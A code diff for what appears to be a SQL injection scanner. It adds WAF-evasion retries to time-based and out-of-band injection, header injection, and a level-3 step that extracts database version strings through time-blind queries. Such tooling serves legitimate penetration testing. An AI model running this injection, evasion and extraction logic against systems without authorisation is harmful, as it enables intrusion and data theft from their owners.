@@ -11,7 +11,7 @@ import time
 from typing import Any, Dict, List, Optional
 
 from ..log import get_logger
-from ..reporter import TimeFinding, OOBFinding, ScanResult
+from ..reporter import TimeFinding, OOBFinding, ExtractionFinding, ScanResult
 from ..http.injector import Injector
 from ..http.waf_detect import EVASION_NONE
 from .options import ScanOptions
@@ -50,36 +50,65 @@ def run_time_based(
     if baseline_time is None:
         return
 
-    for raw_payload in payloads:
-        payload = apply_evasion(raw_payload, evasion)
-        elapsed = _timed_fetch(injector, url, method, params, param, payload,
-                               second_url=second_url, json_body=json_body, path_index=path_index)
-        if elapsed is None:
-            continue
+    _prev_count = len(result.time_based)
 
-        # Hit if we exceed threshold AND the delay is at least 2× baseline
-        if elapsed >= opts.time_threshold and elapsed >= baseline_time * 2:
-            # Confirm with a second request
-            elapsed2 = _timed_fetch(injector, url, method, params, param, payload,
-                                    second_url=second_url, json_body=json_body, path_index=path_index)
-            if elapsed2 is not None and elapsed2 >= opts.time_threshold:
-                _dbms = _infer_dbms_from_payload(raw_payload)
-                logger.finding(
-                    "Time-based SQLi: %s param=%s delay=%.2fs payload=%s",
-                    url, param, elapsed, payload,
-                )
-                result.append_time(TimeFinding(
-                    url=url,
-                    parameter=param,
-                    method=method,
-                    payload=payload,
-                    dbms=_dbms,
-                    observed_delay=round(elapsed, 2),
-                    threshold=opts.time_threshold,
-                ))
-                if result.dbms_detected is None and _dbms != "unknown":
-                    result.dbms_detected = _dbms
-                return  # one finding per param is enough
+    for evasion in (evasions if evasions else [EVASION_NONE]):
+        for raw_payload in payloads:
+            payload = apply_evasion(raw_payload, evasion)
+            elapsed = _timed_fetch(injector, url, method, params, param, payload,
+                                   second_url=second_url, json_body=json_body, path_index=path_index)
+            if elapsed is None:
+                continue
+
+            # Hit if we exceed threshold AND the delay is at least 2× baseline
+            if elapsed >= opts.time_threshold and elapsed >= baseline_time * 2:
+                # Confirm with a second request
+                elapsed2 = _timed_fetch(injector, url, method, params, param, payload,
+                                        second_url=second_url, json_body=json_body, path_index=path_index)
+                if elapsed2 is not None and elapsed2 >= opts.time_threshold:
+                    _dbms = _infer_dbms_from_payload(raw_payload)
+                    logger.finding(
+                        "Time-based SQLi: %s param=%s delay=%.2fs payload=%s",
+                        url, param, elapsed, payload,
+                    )
+                    result.append_time(TimeFinding(
+                        url=url,
+                        parameter=param,
+                        method=method,
+                        payload=payload,
+                        dbms=_dbms,
+                        observed_delay=round(elapsed, 2),
+                        threshold=opts.time_threshold,
+                    ))
+                    if result.dbms_detected is None and _dbms != "unknown":
+                        result.dbms_detected = _dbms
+                    # Level 3: attempt data extraction via time-blind char extractor
+                    if opts.level >= 3:
+                        from .extract import extract_value
+                        _expr = "VERSION()" if _dbms not in ("sqlite", "oracle") else "sqlite_version()" if _dbms == "sqlite" else "(SELECT banner FROM v$version WHERE rownum=1)"
+                        _baseline_resp = ""
+                        _extracted = extract_value(
+                            expr=_expr,
+                            surface={"url": url, "method": method, "params": params,
+                                     "single_param": param,
+                                     "json_body": json_body, "path_index": path_index},
+                            evasions=[evasion],
+                            opts=opts,
+                            injector=injector,
+                            baseline=_baseline_resp,
+                            mode="time",
+                        )
+                        if _extracted:
+                            logger.finding("Extracted via time blind: %s param=%s value=%s", url, param, _extracted)
+                            result.append_extraction(ExtractionFinding(
+                                url=url, parameter=param, method=method,
+                                expr=_expr, value=_extracted, mode="time",
+                            ))
+                    return  # one finding per param is enough
+
+        # If a finding was recorded with this evasion, stop escalating
+        if len(result.time_based) > _prev_count:
+            break
 
 
 def run_oob(
@@ -104,34 +133,40 @@ def run_oob(
     dbms    = result.dbms_detected or opts.dbms
 
     payloads = get_oob_payloads(dbms, opts.oob_callback)
+    _prev_count = len(result.oob) if hasattr(result, "oob") else 0
 
-    for raw_payload in payloads:
-        payload = apply_evasion(raw_payload, evasion)
-        try:
-            if method.upper() == "POST":
-                if json_body:
-                    injector.post(url, json_body={**params, param: payload})
+    for evasion in (evasions if evasions else [EVASION_NONE]):
+        for raw_payload in payloads:
+            payload = apply_evasion(raw_payload, evasion)
+            try:
+                if method.upper() == "POST":
+                    if json_body:
+                        injector.post(url, json_body={**params, param: payload})
+                    else:
+                        injector.post(url, data={**params, param: payload})
+                elif method.upper() == "PATH":
+                    injector.inject_path(url, path_index, payload)
+                elif method.upper() == "COOKIE":
+                    injector.inject_cookie(url, param, payload)
                 else:
-                    injector.post(url, data={**params, param: payload})
-            elif method.upper() == "PATH":
-                injector.inject_path(url, path_index, payload)
-            elif method.upper() == "COOKIE":
-                injector.inject_cookie(url, param, payload)
-            else:
-                injector.inject_get(url, param, payload)
-        except Exception as exc:
-            logger.debug("OOB inject error %s param=%s: %s", url, param, exc)
-            continue
+                    injector.inject_get(url, param, payload)
+            except Exception as exc:
+                logger.debug("OOB inject error %s param=%s: %s", url, param, exc)
+                continue
 
-        logger.finding("OOB payload injected: %s param=%s", url, param)
-        result.append_oob(OOBFinding(
-            url=url,
-            parameter=param,
-            method=method,
-            payload=payload,
-            callback_url=opts.oob_callback,
-        ))
-        return  # one OOB injection per param
+            logger.finding("OOB payload injected: %s param=%s", url, param)
+            result.append_oob(OOBFinding(
+                url=url,
+                parameter=param,
+                method=method,
+                payload=payload,
+                callback_url=opts.oob_callback,
+            ))
+            return  # one OOB injection per param
+
+        _cur_count = len(result.oob) if hasattr(result, "oob") else 0
+        if _cur_count > _prev_count:
+            break
 
 
 # ---------------------------------------------------------------------------
@@ -173,6 +208,8 @@ def _timed_fetch(
                 injector.inject_path(url, path_index, injected_value)
             elif method.upper() == "COOKIE":
                 injector.inject_cookie(url, param, injected_value)
+            elif method.upper() == "HEADER":
+                injector.inject_header(url, param, injected_value)
             else:
                 injector.inject_get(url, param, injected_value)
             injector.get(second_url)
@@ -185,6 +222,8 @@ def _timed_fetch(
             injector.inject_path(url, path_index, injected_value)
         elif method.upper() == "COOKIE":
             injector.inject_cookie(url, param, injected_value)
+        elif method.upper() == "HEADER":
+            injector.inject_header(url, param, injected_value)
         else:
             injector.inject_get(url, param, injected_value)
         return time.monotonic() - t0
